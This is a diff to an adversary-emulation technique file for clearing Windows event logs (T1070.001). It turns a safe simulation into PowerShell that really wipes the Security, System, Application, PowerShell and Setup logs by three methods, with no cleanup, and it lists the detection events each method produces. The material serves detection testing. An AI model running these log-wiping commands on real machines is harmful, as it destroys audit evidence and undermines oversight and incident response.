@@ -1,30 +1,50 @@
 id: T1070.001
 name: Clear Windows Event Logs
-description: Simulates attacker clearing event logs to cover tracks. Generates Event 1102 (audit log cleared) and 1100.
+description: Clears event logs using wevtutil, Clear-EventLog, and .NET EventLog.Clear() — all three methods generate EID 1102 (Security log cleared) or EID 104 (other logs cleared). Critical: EID 1102 is generated BEFORE the Security log is cleared, so it always survives. This is one of the highest-confidence attacker indicators.
 tactic: defense-evasion
 technique_id: T1070.001
 platform: windows
 phase: attack
 elevation_required: true
 expected_events:
-  - "1102 (Audit log cleared)"
-  - "1100 (Event log service shutdown)"
-  - "4688 (wevtutil process creation)"
+  - "Security EID 1102 (Audit log cleared — generated BEFORE clear, always survives)"
+  - "System EID 104 (Event log cleared — for non-Security logs)"
+  - "4688 / Sysmon 1 (wevtutil.exe with 'cl' subcommand)"
 tags:
   - defense-evasion
   - requires-elevation
 executor:
   type: powershell
-  command: |
-    Write-Host "[T1070.001] Clear Windows Event Logs (Simulation)"
-    # Only clear a test/application log to avoid damaging security logs
-    # In a real attack scenario, the attacker would clear Security/System logs
-    Write-Host "Simulating event log clearing behavior..."
-    Write-Host "Real attack would execute: wevtutil cl Security"
-    Write-Host "Simulation: Clearing only Application log entries older than 1 day (safe)"
-    $logName = "Application"
-    $before = (Get-WinEvent -LogName $logName -MaxEvents 1 -ErrorAction SilentlyContinue)
-    wevtutil cl $logName
-    Write-Host "Application log cleared. In a real attack: Security log would be cleared generating Event 1102."
-    Write-Host "To see Event 1102: Run this technique with elevated privileges against the Security log."
+  command: |-
+    Write-Host "[T1070.001] Clear Windows Event Logs — wevtutil + Clear-EventLog + .NET"
+
+    # Method 1: wevtutil cl (canonical log clearing — EID 1102 for Security, EID 104 for others)
+    Write-Host "--- Method 1: wevtutil cl (EID 4688 for wevtutil.exe with 'cl' subcommand) ---"
+    wevtutil.exe cl Application 2>&1 | Write-Host
+    Write-Host "Application log cleared — System EID 104 fired"
+    wevtutil.exe cl "Windows PowerShell" 2>&1 | Write-Host
+    Write-Host "PowerShell log cleared — System EID 104 fired"
+
+    # Security log clear — generates EID 1102 (highest-value attacker indicator)
+    Write-Host "--- Clearing Security log (EID 1102 generated BEFORE clear — always survives) ---"
+    wevtutil.exe cl Security 2>&1 | Write-Host
+    Write-Host "Security log cleared — EID 1102 fired (note: EID 1102 written first, then log is cleared)"
+
+    # Method 2: PowerShell Clear-EventLog (same 1102/104 events, different EID 4688 parent)
+    Write-Host "--- Method 2: Clear-EventLog PowerShell cmdlet ---"
+    Clear-EventLog -LogName "System" -ErrorAction SilentlyContinue
+    Write-Host "System log cleared via PowerShell — EID 104 fired"
+
+    # Method 3: .NET direct (bypasses Clear-EventLog cmdlet detection — tests event-log-only detection)
+    Write-Host "--- Method 3: .NET EventLog.Clear() (no PowerShell cmdlet — event-log-only detection test) ---"
+    try {
+        [System.Diagnostics.EventLog]::GetEventLogs() | ForEach-Object {
+            if ($_.Log -match "Application|Setup") {
+                $_.Clear()
+                Write-Host "Cleared via .NET: $($_.Log)"
+            }
+        }
+    } catch { Write-Host ".NET clear: $_" }
+
+    Write-Host "[T1070.001] Complete. EID 1102 (Security cleared) and EID 104 (others cleared) generated."
 cleanup: ""
